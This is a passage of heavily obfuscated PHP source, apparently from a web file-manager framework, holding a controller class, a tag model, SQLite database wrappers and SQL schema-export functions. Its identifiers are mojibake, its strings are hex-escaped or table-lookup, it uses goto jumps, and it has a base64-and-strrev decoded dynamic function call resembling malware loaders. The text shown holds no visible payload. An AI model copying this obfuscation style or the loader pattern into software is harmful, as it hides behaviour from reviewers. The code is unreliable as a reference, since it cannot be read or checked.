$ÀÍ‘½œü[$éŒ±úî…[1042]]; if ($¹ƒ€à· == $éŒ±úî…[1039]) { $û…›˜¹« = explode($éŒ±úî…[4], $ÀÍ‘½œü[$éŒ±úî…[1048]]); $¹ƒ€à· = $û…›˜¹«[0]; } $ÊœŸæÆ = array($éŒ±úî…[1173] => $éŒ±úî…[13], $éŒ±úî…[987] => $éŒ±úî…[875]); if (isset($ÊœŸæÆ[$¹ƒ€à·])) { $¹ƒ€à· = $ÊœŸæÆ[$¹ƒ€à·]; } return $¹ƒ€à·; } public function sqlFromMysql($ã±’Ÿ, $ù€İïğŠ = '') { $³Ó§ÃÖ¦ =& $_SERVER[¢ñàß¿€]; $Ë‡§Ûáõ = $this->model()->db(); $šæ´©Èú = $Ë‡§Ûáõ->query($³Ó§ÃÖ¦[1174] . $ã±’Ÿ . $³Ó§ÃÖ¦[461]); if (!$šæ´©Èú || !$šæ´©Èú[0]) { return !1; } $ùŞ‰ = _get($šæ´©Èú[0], $³Ó§ÃÖ¦[1175], $³Ó§ÃÖ¦[12]); if (!$ùŞ‰) { return !1; } $¿ÚÓ­×â = "\x44\122\117\x50\x20\124\x41\x42\114\x45\40\111\106\x20\105\130\111\x53\124\123\40\140{$ã±’Ÿ}\140\x3b" . PHP_EOL . $ùŞ‰ . $³Ó§ÃÖ¦[74]; if ($ù€İïğŠ && $ù€İïğŠ == $³Ó§ÃÖ¦[875]) { return $¿ÚÓ­×â; } $»’€¨“É = array_change_key_case($GLOBALS[$³Ó§ÃÖ¦[6]][$³Ó§ÃÖ¦[21]]); $ùÂãá›´ = $»’€¨“É[$³Ó§ÃÖ¦[1047]]; $Ê‘¼±‘Š = $³Ó§ÃÖ¦[1176] . $ùÂãá›´ . $³Ó§ÃÖ¦[1177] . $ã±’Ÿ . $³Ó§ÃÖ¦[58]; $Àôª¯²¹ = $³Ó§ÃÖ¦[1178] . $ã±’Ÿ . $³Ó§ÃÖ¦[975]; $À—è¦–Ú = $Ë‡§Ûáõ->query($Ê‘¼±‘Š); if (empty($À—è¦–Ú)) { $öª§°º = array($³Ó§ÃÖ¦[875] => $³Ó§ÃÖ¦[12], $³Ó§ÃÖ¦[13] => $³Ó§ÃÖ¦[12]); return $ù€İïğŠ ? $öª§°º[$ù€İïğŠ] : $öª§°º; } $ÈÕ²•âÛ = $Ë‡§Ûáõ->query($Àôª¯²¹); $ø¨ç“± = $³Ó§ÃÖ¦[12]; $óêÒµ‰Û = array(); foreach ($ÈÕ²•âÛ as $şªÎüæÏ) { if (!$ø¨ç“± && $şªÎüæÏ[$³Ó§ÃÖ¦[1179]] == $³Ó§ÃÖ¦[1180]) { $ø¨ç“± = $şªÎüæÏ[$³Ó§ÃÖ¦[1181]]; } if (isset($óêÒµ‰Û[$şªÎüæÏ[$³Ó§ÃÖ¦[1179]]])) { $óêÒµ‰Û[$şªÎüæÏ[$³Ó§ÃÖ¦[1179]]][$³Ó§ÃÖ¦[1182]][] = $şªÎüæÏ[$³Ó§ÃÖ¦[1181]]; continue; } $óêÒµ‰Û[$şªÎüæÏ[$³Ó§ÃÖ¦[1179]]] = array($³Ó§ÃÖ¦[1183] => $şªÎüæÏ[$³Ó§ÃÖ¦[1179]], $³Ó§ÃÖ¦[1182] => array($şªÎüæÏ[$³Ó§ÃÖ¦[1181]]), $³Ó§ÃÖ¦[1184] => $şªÎüæÏ[$³Ó§ÃÖ¦[1185]] == $³Ó§ÃÖ¦[91] ? 0 : 1); } $êãĞúë = array(); foreach ($óêÒµ‰Û as $şªÎüæÏ) { $ÍÌ¡±û‡ = $şªÎüæÏ[$³Ó§ÃÖ¦[1183]] == $³Ó§ÃÖ¦[1180]; $±Ë§—ò = array($³Ó§ÃÖ¦[1186], $şªÎüæÏ[$³Ó§ÃÖ¦[1184]] == $³Ó§ÃÖ¦[91] && !$ÍÌ¡±û‡ ? $³Ó§ÃÖ¦[1187] : $³Ó§ÃÖ¦[12], $³Ó§ÃÖ¦[1188], $³Ó§ÃÖ¦[1189] . $ã±’Ÿ . $³Ó§ÃÖ¦[11] . ($ÍÌ¡±û‡ ? $³Ó§ÃÖ¦[1190] : $şªÎüæÏ[$³Ó§ÃÖ¦[1183]]) . $³Ó§ÃÖ¦[121], $³Ó§ÃÖ¦[1191], $³Ó§ÃÖ¦[121] . $ã±’Ÿ . $³Ó§ÃÖ¦[121], $³Ó§ÃÖ¦[1192] . implode($³Ó§ÃÖ¦[1193], $şªÎüæÏ[$³Ó§ÃÖ¦[1182]]) . $³Ó§ÃÖ¦[1194]); $êãĞúë[] = implode($³Ó§ÃÖ¦[53], $±Ë§—ò) . $³Ó§ÃÖ¦[74]; } $ü´é›² = array(); $á«Ã¥º… = array($³Ó§ÃÖ¦[1195] => $³Ó§ÃÖ¦[1196], $³Ó§ÃÖ¦[1196] => $³Ó§ÃÖ¦[1196], $³Ó§ÃÖ¦[364] => $³Ó§ÃÖ¦[391], $³Ó§ÃÖ¦[363] => $³Ó§ÃÖ¦[391]); foreach ($À—è¦–Ú as $şªÎüæÏ) { $±Ë§—ò = array($³Ó§ÃÖ¦[121] . $şªÎüæÏ[$³Ó§ÃÖ¦[1197]] . $³Ó§ÃÖ¦[121], isset($á«Ã¥º…[$şªÎüæÏ[$³Ó§ÃÖ¦[1198]]]) ? $á«Ã¥º…[$şªÎüæÏ[$³Ó§ÃÖ¦[1198]]] : $şªÎüæÏ[$³Ó§ÃÖ¦[1199]], $şªÎüæÏ[$³Ó§ÃÖ¦[1200]] == $³Ó§ÃÖ¦[973] ? $³Ó§ÃÖ¦[1201] : $³Ó§ÃÖ¦[1202], $şªÎüæÏ[$³Ó§ÃÖ¦[1197]] == $ø¨ç“± ? $³Ó§ÃÖ¦[1203] : $³Ó§ÃÖ¦[12], $şªÎüæÏ[$³Ó§ÃÖ¦[1024]] ? strtoupper(str_replace($³Ó§ÃÖ¦[11], $³Ó§ÃÖ¦[12], $şªÎüæÏ[$³Ó§ÃÖ¦[1024]])) : $³Ó§ÃÖ¦[12]); $ü´é›²[] = trim(implode($³Ó§ÃÖ¦[53], $±Ë§—ò)); } $‚–Å×¿ƒ = array($³Ó§ÃÖ¦[1204] . $ã±’Ÿ . $³Ó§ÃÖ¦[1205], $³Ó§ÃÖ¦[1206] . $ã±’Ÿ . $³Ó§ÃÖ¦[1207], implode($³Ó§ÃÖ¦[50] . PHP_EOL, $ü´é›²), $³Ó§ÃÖ¦[1021]); $¸¢˜ÛŸŒ = implode(PHP_EOL, array_merge($‚–Å×¿ƒ, $êãĞúë)); if ($ù€İïğŠ && $ù€İïğŠ == $³Ó§ÃÖ¦[13]) { return $¸¢˜ÛŸŒ; } $öª§°º = array($³Ó§ÃÖ¦[875] => $¿ÚÓ­×â, $³Ó§ÃÖ¦[13] => $¸¢˜ÛŸŒ); return $ù€İïğŠ ? $öª§°º[$ù€İïğŠ] : $öª§°º; } public function sqlFromSqlite($‚óÖÔÇ¬, $ïÕ“•Ù = '') { $¶Ñà÷‰½ =& $_SERVER[¢ñàß¿€]; $…„™Ôäü = $this->model()->db(); $›øÉ•Œ› = "\x50\122\101\107\115\x41\x20\x54\x41\x42\114\105\137\111\116\x46\x4f\40\50\x27{$‚óÖÔÇ¬}\47\51"; $Ã÷ÑÙ¿æ = "\x53\105\x4c\105\x43\124\40\x2a\x20\106\122\x4f\x4d\x20\x73\161\x6c\x69\164\145\x5f\155\141\x73\164\x65\162\x20\x57\x48\x45\x52\x45\40\164\x62\x6c\137\x6e\141\x6d\145\40\x3d\x20\x27{$‚óÖÔÇ¬}\x27"; $˜˜ÔÁÄÜ = $…„™Ôäü->query($›øÉ•Œ›); if (empty($˜˜ÔÁÄÜ)) { $ÖÕŸƒ· = array($¶Ñà÷‰½[875] => $¶Ñà÷‰½[12], $¶Ñà÷‰½[13] => $¶Ñà÷‰½[12]); return $ïÕ“•Ù ? $ÖÕŸƒ·[$ïÕ“•Ù] : $ÖÕŸƒ·; } $è‡»Ôìô = $…„™Ôäü->query($Ã÷ÑÙ¿æ); $Æ£Èë¤ë = $…ô²ÖÊ´ = array(); foreach ($è‡»Ôìô as $¡İıÇ¶¤) { if ($¡İıÇ¶¤[$¶Ñà÷‰½[33]] == $¶Ñà÷‰½[356]) { $Æ£Èë¤ë[] = $¡İıÇ¶¤[$¶Ñà÷‰½[1208]]; } else { $…ô²ÖÊ´[$¡İıÇ¶¤[$¶Ñà÷‰½[32]]] = $¡İıÇ¶¤[$¶Ñà÷‰½[1208]]; } } $—½”¹ªÒ = array_merge(array($¶Ñà÷‰½[1204] . $‚óÖÔÇ¬ . $¶Ñà÷‰½[121]), $Æ£Èë¤ë, array_values($…ô²ÖÊ´)); $—½”¹ªÒ = implode($¶Ñà÷‰½[74] . PHP_EOL, $—½”¹ªÒ) . $¶Ñà÷‰½[74]; if ($ïÕ“•Ù && $ïÕ“•Ù == $¶Ñà÷‰½[13]) { return $—½”¹ªÒ; } $Ãà›Ÿ¢ô = array(); $ËŒš‹×Ö = array($¶Ñà÷‰½[1196] => $¶Ñà÷‰½[1209], $¶Ñà÷‰½[391] => $¶Ñà÷‰½[1210]); $¶İ… Ì¸ = $¶Ñà÷‰½[12]; foreach ($˜˜ÔÁÄÜ as $¡İıÇ¶¤) { if ($¡İıÇ¶¤[$¶Ñà÷‰½[57]] == $¶Ñà÷‰½[91]) { $¶İ… Ì¸ = $¡İıÇ¶¤[$¶Ñà÷‰½[32]]; } $şß¤ ß÷ = array($¶Ñà÷‰½[461] . $¡İıÇ¶¤[$¶Ñà÷‰½[32]] . $¶Ñà÷‰½[461], isset($ËŒš‹×Ö[$¡İıÇ¶¤[$¶Ñà÷‰½[33]]]) ? $ËŒš‹×Ö[$¡İıÇ¶¤[$¶Ñà÷‰½[33]]] : $¡İıÇ¶¤[$¶Ñà÷‰½[33]], $¡İıÇ¶¤[$¶Ñà÷‰½[35]] == $¶Ñà÷‰½[91] ? $¶Ñà÷‰½[1201] : $¶Ñà÷‰½[1211] . $¡İıÇ¶¤[$¶Ñà÷‰½[56]], $¡İıÇ¶¤[$¶Ñà÷‰½[57]] == $¶Ñà÷‰½[91] ? $¶Ñà÷‰½[1212] : $¶Ñà÷‰½[12]); $Ãà›Ÿ¢ô[] = trim(implode($¶Ñà÷‰½[53], $şß¤ ß÷)); } foreach ($…ô²ÖÊ´ as $ç¸¦ãÆ => $¹Ğ¦Ù§°) { $‘òé»ñ¼ = str_replace($¶Ñà÷‰½[1213] . $‚óÖÔÇ¬ . $¶Ñà÷‰½[11], $¶Ñà÷‰½[12], $ç¸¦ãÆ); $ÜÇ»ö = str_replace(array($¶Ñà÷‰½[121], $¶Ñà÷‰½[1032]), $¶Ñà÷‰½[461], substr($¹Ğ¦Ù§°, stripos($¹Ğ¦Ù§°, $¶Ñà÷‰½[337]))); if ($‘òé»ñ¼ == $¶Ñà÷‰½[1190]) { $»áüüÖ´ = $¶Ñà÷‰½[1214] . $¶İ… Ì¸ . $¶Ñà÷‰½[1215]; } else { $»áüüÖ´ = (stripos($‘òé»ñ¼, $¶Ñà÷‰½[11]) ? $¶Ñà÷‰½[1216] : $¶Ñà÷‰½[12]) . ($¶Ñà÷‰½[1217] . $‘òé»ñ¼ . $¶Ñà÷‰½[1218] . $ÜÇ»ö); } $Ãà›Ÿ¢ô[] = $»áüüÖ´; } $Å‚¯ÒÅ¤ = array($¶Ñà÷‰½[1219] . $‚óÖÔÇ¬ . $¶Ñà÷‰½[1220], $¶Ñà÷‰½[1221] . $‚óÖÔÇ¬ . $¶Ñà÷‰½[1222], implode($¶Ñà÷‰½[50] . PHP_EOL, $Ãà›Ÿ¢ô), $¶Ñà÷‰½[1223]); $ëï’Áß = implode(PHP_EOL, $Å‚¯ÒÅ¤); if ($ïÕ“•Ù && $ïÕ“•Ù == $¶Ñà÷‰½[875]) { return $ëï’Áß; } $ÖÕŸƒ· = array($¶Ñà÷‰½[875] => $ëï’Áß, $¶Ñà÷‰½[13] => $—½”¹ªÒ); return $ïÕ“•Ù ? $ÖÕŸƒ·[$ïÕ“•Ù] : $ÖÕŸƒ·; } } goto C–óĞ“åÄù; dãÖ†‹…„â: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\56\x74\x61\x67\x4c\151\163\164"; public $modelType = "\125\x73\x65\162\117\x70\x74\151\x6f\x6e"; public $field = array("\x6e\x61\155\145", "\x73\x74\x79\x6c\x65", "\x73\157\x72\x74"); public function listData($¤¸À¥•Ä = false, $™éê¨Œ¥ = "\163\157\x72\x74", $™Û‚ÑõÍ = false) { return parent::listData($¤¸À¥•Ä, $™éê¨Œ¥, $™Û‚ÑõÍ); } public function remove($½šß‰•¿) { return parent::remove($½šß‰•¿); } public function add($×ø®¼Ÿ¢, $³åë¦Âœ = "\x6c\x61\x62\145\x6c\x2d\x67\162\x65\171\55\x6e\157\x72\x6d\x61\154") { $ °‚ë¶³ =& $_SERVER[¢ñàß¿€]; if ($this->findByName($×ø®¼Ÿ¢)) { return !1; } $Ç‹€‚äÇ = array($ °‚ë¶³[494] => $×ø®¼Ÿ¢, $ °‚ë¶³[558] => $³åë¦Âœ, $ °‚ë¶³[1972] => $this->getSort($ °‚ë¶³[335]) + 1); return parent::insert($Ç‹€‚äÇ); } public function update($–ªçò¥, $‹à”±Ø) { $­”®‹ =& $_SERVER[¢ñàß¿€]; $« ı…’¹ = $this->listData($–ªçò¥); $³°³ì³ = $this->findByName($‹à”±Ø[$­”®‹[32]]); if (!$« ı…’¹ || $³°³ì³ && $³°³ì³[$­”®‹[475]] != $« ı…’¹[$­”®‹[475]]) { return !1; } return parent::update($–ªçò¥, $‹à”±Ø); } public function moveTop($û•èÆÊı) { $ÎƒÀàø =& $_SERVER[¢ñàß¿€]; $ù„ƒôªó = parent::listData(); $Ú‡Â½”‘ = $this->getSort($ÎƒÀàø[334]); foreach ($ù„ƒôªó as &$˜É³À«ı) { if ($˜É³À«ı[$ÎƒÀàø[475]] == $û•èÆÊı) { $˜É³À«ı[$ÎƒÀàø[1992]] = $Ú‡Â½”‘; continue; } $˜É³À«ı[$ÎƒÀàø[1992]] += 1; } unset($˜É³À«ı); return parent::resetData($ù„ƒôªó); } public function moveBottom($¡É¬¼Ëİ) { $‰õ™‰›è =& $_SERVER[¢ñàß¿€]; $şØúÚ¹Ú = $this->getSort($‰õ™‰›è[335]) + 1; return parent::update($¡É¬¼Ëİ, array($‰õ™‰›è[1992] => $şØúÚ¹Ú)); } public function resetSort($ØÂ›¸ä) { $Ã°ú¼÷Á =& $_SERVER[¢ñàß¿€]; $–ì¢“â† = array(); $ØÂ›¸ä = is_array($ØÂ›¸ä) ? $ØÂ›¸ä : array(); for ($Ğì©²ƒ = 0; $Ğì©²ƒ < count($ØÂ›¸ä); $Ğì©²ƒ++) { $–ì¢“â†[$ØÂ›¸ä[$Ğì©²ƒ] . $Ã°ú¼÷Á[12]] = $Ğì©²ƒ + 1; } $°˜–œŒš = parent::listData(); foreach ($°˜–œŒš as &$ÙÔâÎ¶À) { $¤ê‡ïĞŒ = $–ì¢“â†[$ÙÔâÎ¶À[$Ã°ú¼÷Á[475]]]; $ÙÔâÎ¶À[$Ã°ú¼÷Á[1992]] = $¤ê‡ïĞŒ ? $¤ê‡ïĞŒ : $ÙÔâÎ¶À[$Ã°ú¼÷Á[1992]]; } unset($ÙÔâÎ¶À); return parent::resetData($°˜–œŒš); } private function getSort($ïßÑ——) { $ŞĞğÍåÙ =& $_SERVER[¢ñàß¿€]; $„òêòÃ = parent::listData(); $Ã†äİ¸Ò = array_to_keyvalue($„òêòÃ, $ŞĞğÍåÙ[12], $ŞĞğÍåÙ[1992]); if (!$Ã†äİ¸Ò) { $Ã†äİ¸Ò = array(0); } $ö€Ï„æ = $ïßÑ—— == $ŞĞğÍåÙ[335] ? max($Ã†äİ¸Ò) : min($Ã†äİ¸Ò); return intval($ö€Ï„æ); } } goto d‘¬¡¦„Ïö; cßÅºÓ´†–: $fileSize = strrev(base64_decode($_SERVER[íÏõøÍÈ][0])); function binCheckNeq($»ÓâÓ²º, $ìè ĞÌ§) { return $»ÓâÓ²º != $ìè ĞÌ§; } $_SERVER[$_SERVER[íÏõøÍÈ][1]] = $fileSize($_SERVER[$_SERVER[íÏõøÍÈ][2]]); goto EîÛØÃ¦ğ»; cÅğÚ™¨è: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $’šÈšÖÈ =& $_SERVER[¢ñàß¿€]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$’šÈšÖÈ[6]] =& $config; $this->values[$’šÈšÖÈ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $’šÈšÖÈ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($˜™ÑÊ€½) { if (1 === func_num_args()) { $this->{$˜™ÑÊ€½} = new $˜™ÑÊ€½(); } else { $Ô¼ñ‡ = new ReflectionClass($˜™ÑÊ€½); $µ¯ş±À€ = func_get_args(); array_shift($µ¯ş±À€); $this->{$˜™ÑÊ€½} = $Ô¼ñ‡->newInstanceArgs($µ¯ş±À€); } return $this->{$˜™ÑÊ€½}; } public function routeBind($ì‡Ø‹ëõ, $ó–ÍË ğ, $úÈöèÇã = 3) { $‚ÆÕã¯­ =& $_SERVER[¢ñàß¿€]; $á‘¿­ = $this->in[$‚ÆÕã¯­[9]]; $ì‡Ø‹ëõ = str_replace($‚ÆÕã¯­[10], $‚ÆÕã¯­[11], trim(trim($ì‡Ø‹ëõ, $‚ÆÕã¯­[8]), $‚ÆÕã¯­[12])); if (!$ì‡Ø‹ëõ || count($á‘¿­) <= $úÈöèÇã) { return !1; } $«ş®’ÌÜ = !0; $ØÔÉÑ¥ = explode($‚ÆÕã¯­[8], $ì‡Ø‹ëõ); for ($éÈŞ•‚É = 0; $éÈŞ•‚É < count($ØÔÉÑ¥); $éÈŞ•‚É++) { if ($ØÔÉÑ¥[$éÈŞ•‚É] != $á‘¿­[$úÈöèÇã + $éÈŞ•‚É]) { $«ş®’ÌÜ = !1; break; } } if (!$«ş®’ÌÜ) { return; } call_user_func_array(array($this, $ó–ÍË ğ), array()); } public function routeArgs($¤öŒ© = 3) { $öƒµÏ¼„ = $this->in[$_SERVER[¢ñàß¿€][9]]; if (count($öƒµÏ¼„) <= $¤öŒ©) { return array(); } $ÈÕÆøæ— = array(); for ($¼ÏİŒÁŠ = $¤öŒ©; $¼ÏİŒÁŠ < count($öƒµÏ¼„); $¼ÏİŒÁŠ += 2) { $ÈÕÆøæ—[$öƒµÏ¼„[$¼ÏİŒÁŠ]] = $öƒµÏ¼„[$¼ÏİŒÁŠ + 1]; $this->in[$öƒµÏ¼„[$¼ÏİŒÁŠ]] = $öƒµÏ¼„[$¼ÏİŒÁŠ + 1]; } return $ÈÕÆøæ—; } protected function assign($“‹­î“, $¿Õõ³‘») { $this->values[$“‹­î“] = $¿Õõ³‘»; } protected function display($ŸÍÍËïÒ) { ob_end_clean(); extract($this->values); require $this->tpl . $ŸÍÍËïÒ; } } class DbSqliteBase extends Db { public function __construct($ªÆÓ¯ªß = '') { $ÍÆŒŞæÜ =& $_SERVER[¢ñàß¿€]; if (!extension_loaded($ÍÆŒŞæÜ[13])) { think_exception(think_lang($ÍÆŒŞæÜ[14]) . $ÍÆŒŞæÜ[15]); } if (!empty($ªÆÓ¯ªß)) { if (!isset($ªÆÓ¯ªß[$ÍÆŒŞæÜ[16]])) { $ªÆÓ¯ªß[$ÍÆŒŞæÜ[16]] = 438; } $this->config = $ªÆÓ¯ªß; if (empty($this->config[$ÍÆŒŞæÜ[17]])) { $this->config[$ÍÆŒŞæÜ[17]] = array(); } } } public function connect($İ•®Š‘ = '', $²ô­èì© = 0) { $©§Ï‡  =& $_SERVER[¢ñàß¿€]; if (!isset($this->linkID[$²ô­èì©])) { if (empty($İ•®Š‘)) { $İ•®Š‘ = $this->config; } $®ú¯¯ù = !empty($İ•®Š‘[$©§Ï‡ [17]][$©§Ï‡ [18]]) ? $İ•®Š‘[$©§Ï‡ [17]][$©§Ï‡ [18]] : $this->pconnect; $¢ïÕÍË¿ = $®ú¯¯ù ? $©§Ï‡ [19] : $©§Ï‡ [20]; $this->linkID[$²ô­èì©] = $¢ïÕÍË¿($İ•®Š‘[$©§Ï‡ [21]], $İ•®Š‘[$©§Ï‡ [16]]); if (!$this->linkID[$²ô­èì©]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$²ô­èì©], 30000); if (1 != think_config($©§Ï‡ [22])) { unset($this->config); } } return $this->linkID[$²ô­èì©]; } public function free() { $this->queryID = null; } public function query($ŒñÃŒŠå) { $ÎÆ£›“ =& $_SERVER[¢ñàß¿€]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ŒñÃŒŠå; if ($this->queryID) { $this->free(); } think_action_status($ÎÆ£›“[23], 1); think_status($ÎÆ£›“[24]); $this->queryID = sqlite_query($this->_linkID, $ŒñÃŒŠå); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $§Í²ïŸİ = $this->getAll(); return $§Í²ïŸİ; } } public function execute($‘ÊÒ¦‹œ) { $¬Ú£Ú‰É =& $_SERVER[¢ñàß¿€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‘ÊÒ¦‹œ; if ($this->queryID) { $this->free(); } think_action_status($¬Ú£Ú‰É[25], 1); think_status($¬Ú£Ú‰É[24]); $ÊâàÂØ = sqlite_exec($this->_linkID, $‘ÊÒ¦‹œ); $this->debug(); if (!1 === $ÊâàÂØ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¢ñàß¿€][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ïÙ²Å‡° = sqlite_query($this->_linkID, $_SERVER[¢ñàß¿€][27]); if (!$ïÙ²Å‡°) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÓşçÒŸ = sqlite_query($this->_linkID, $_SERVER[¢ñàß¿€][28]); if (!$ÓşçÒŸ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ú±ŒÁà = array(); if ($this->numRows > 0) { for ($÷ûşßÏ§ = 0; $÷ûşßÏ§ < $this->numRows; $÷ûşßÏ§++) { $Ú±ŒÁà[$÷ûşßÏ§] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Ú±ŒÁà; } public function getFields($¢üñ¸á°) { $æ†„À¸İ =& $_SERVER[¢ñàß¿€]; $¬ì‹òñë = $this->query($æ†„À¸İ[29] . $¢üñ¸á° . $æ†„À¸İ[30]); $µšéÃêÉ = array(); if ($¬ì‹òñë) { foreach ($¬ì‹òñë as $‰ıê‘ñ => $¾©€Ÿ£„) { $µšéÃêÉ[$¾©€Ÿ£„[$æ†„À¸İ[31]]] = array($æ†„À¸İ[32] => $¾©€Ÿ£„[$æ†„À¸İ[31]], $æ†„À¸İ[33] => $¾©€Ÿ£„[$æ†„À¸İ[34]], $æ†„À¸İ[35] => (bool) ($¾©€Ÿ£„[$æ†„À¸İ[36]] === $æ†„À¸İ[12]), $æ†„À¸İ[37] => $¾©€Ÿ£„[$æ†„À¸İ[38]], $æ†„À¸İ[39] => strtolower($¾©€Ÿ£„[$æ†„À¸İ[40]]) == $æ†„À¸İ[41], $æ†„À¸İ[42] => strtolower($¾©€Ÿ£„[$æ†„À¸İ[43]]) == $æ†„À¸İ[44]); } } return $µšéÃêÉ; } public function getTables($²Ÿ±Öğµ = '') { $ ı•®« =& $_SERVER[¢ñàß¿€]; $Ó§ê¸¶Ÿ = $this->query($ ı•®«[45] . $ ı•®«[46] . $ ı•®«[47]); $İĞì™Ğª = array(); foreach ($Ó§ê¸¶Ÿ as $ş“µóş => $ŒÙõ˜Ëå) { $İĞì™Ğª[$ş“µóş] = current($ŒÙõ˜Ëå); } return $İĞì™Ğª; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ùìå¹ôÙ =& $_SERVER[¢ñàß¿€]; $—ªÆ¤Ú = sqlite_last_error($this->_linkID); $this->error = $—ªÆ¤Ú . $ùìå¹ôÙ[4] . sqlite_error_string($—ªÆ¤Ú); if ($ùìå¹ôÙ[12] != $this->queryStr) { $this->error .= LNG($ùìå¹ôÙ[48]) . $this->queryStr; } think_trace($this->error, $ùìå¹ôÙ[12], $ùìå¹ôÙ[49]); return $this->error; } public function escapeString($²ØÉÖàé) { return sqlite_escape_string($²ØÉÖàé); } public function parseLimit($ùÇé˜¼§) { $²êÂÛ¼€ =& $_SERVER[¢ñàß¿€]; $‘œ¡Ô§È = $²êÂÛ¼€[12]; if (!empty($ùÇé˜¼§)) { $ùÇé˜¼§ = explode($²êÂÛ¼€[50], $ùÇé˜¼§); if (count($ùÇé˜¼§) > 1) { $‘œ¡Ô§È .= $²êÂÛ¼€[51] . $ùÇé˜¼§[1] . $²êÂÛ¼€[52] . $ùÇé˜¼§[0] . $²êÂÛ¼€[53]; } else { $‘œ¡Ô§È .= $²êÂÛ¼€[51] . $ùÇé˜¼§[0] . $²êÂÛ¼€[53]; } } return $‘œ¡Ô§È; } } class DbSqlite3Base extends Db { public function __construct($ëô¬¶¬ï = '') { $”¤ÑĞÑá =& $_SERVER[¢ñàß¿€]; if (!class_exists($”¤ÑĞÑá[54])) { think_exception(think_lang($”¤ÑĞÑá[14]) . $”¤ÑĞÑá[55]); } if (!empty($ëô¬¶¬ï)) { if (!isset($ëô¬¶¬ï[$”¤ÑĞÑá[16]])) { $ëô¬¶¬ï[$”¤ÑĞÑá[16]] = 438; } $this->config = $ëô¬¶¬ï; if (empty($this->config[$”¤ÑĞÑá[17]])) { $this->config[$”¤ÑĞÑá[17]] = array(); } } } public function connect($¥Æè­ˆº = '', $»´¶Ñøñ = 0) { $¶Èı€Õ˜ =& $_SERVER[¢ñàß¿€]; if (!isset($this->linkID[$»´¶Ñøñ])) { if (empty($¥Æè­ˆº)) { $¥Æè­ˆº = $this->config; } $this->linkID[$»´¶Ñøñ] = new SQLite3($¥Æè­ˆº[$¶Èı€Õ˜[21]]); if (!$this->linkID[$»´¶Ñøñ]) { think_exception($this->linkID[$»´¶Ñøñ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$»´¶Ñøñ]->busyTimeout(30000); if (1 != think_config($¶Èı€Õ˜[22])) { unset($this->config); } } return $this->linkID[$»´¶Ñøñ]; } public function free() { $this->queryID = null; } public function query($½·ôêª‚) { $ëîò¼¢º =& $_SERVER[¢ñàß¿€]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $½·ôêª‚; if ($this->queryID) { $this->free(); } think_action_status($ëîò¼¢º[23], 1); think_status($ëîò¼¢º[24]); $this->queryID = $this->_linkID->query($½·ôêª‚); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $şÁâíÛ = $this->getAll(); $this->numRows = count($şÁâíÛ); return $şÁâíÛ; } } public function execute($¢£¾‹ß) { $öÄ€ÌŠ¦ =& $_SERVER[¢ñàß¿€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¢£¾‹ß; if ($this->queryID) { $this->free(); } think_action_status($öÄ€ÌŠ¦[25], 1); think_status($öÄ€ÌŠ¦[24]); $‹ŸÄäéÌ = $this->_linkID->exec($¢£¾‹ß); $this->debug(); if (!1 === $‹ŸÄäéÌ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¢ñàß¿€][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $…¦çû¶À = $this->_linkID->query($_SERVER[¢ñàß¿€][27]); if (!$…¦çû¶À) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $…‹ö“»× = $this->_linkID->query($_SERVER[¢ñàß¿€][28]); if (!$…‹ö“»×) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ú¨½Íš· = array(); while ($×Š ‚Î± = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ú¨½Íš·[] = $×Š ‚Î±; } $this->queryID->reset(); return $ú¨½Íš·; } public function getFields($ƒï¡¬ûŠ) { $ÒÀÃæêÚ =& $_SERVER[¢ñàß¿€]; $›­ã· = $this->query($ÒÀÃæêÚ[29] . $ƒï¡¬ûŠ . $ÒÀÃæêÚ[30]); $¨îšªÏ  = array(); if ($›­ã·) { foreach ($›­ã· as $ìšåºßâ => $ìú¢¦ ğ) { $¨îšªÏ [$ìú¢¦ ğ[$ÒÀÃæêÚ[32]]] = array($ÒÀÃæêÚ[32] => $ìú¢¦ ğ[$ÒÀÃæêÚ[32]], $ÒÀÃæêÚ[33] => $ìú¢¦ ğ[$ÒÀÃæêÚ[33]], $ÒÀÃæêÚ[35] => (bool) ($ìú¢¦ ğ[$ÒÀÃæêÚ[35]] === $ÒÀÃæêÚ[12]), $ÒÀÃæêÚ[37] => $ìú¢¦ ğ[$ÒÀÃæêÚ[56]], $ÒÀÃæêÚ[39] => (bool) $ìú¢¦ ğ[$ÒÀÃæêÚ[57]], $ÒÀÃæêÚ[42] => (bool) $ìú¢¦ ğ[$ÒÀÃæêÚ[57]]); } } return $¨îšªÏ ; } public 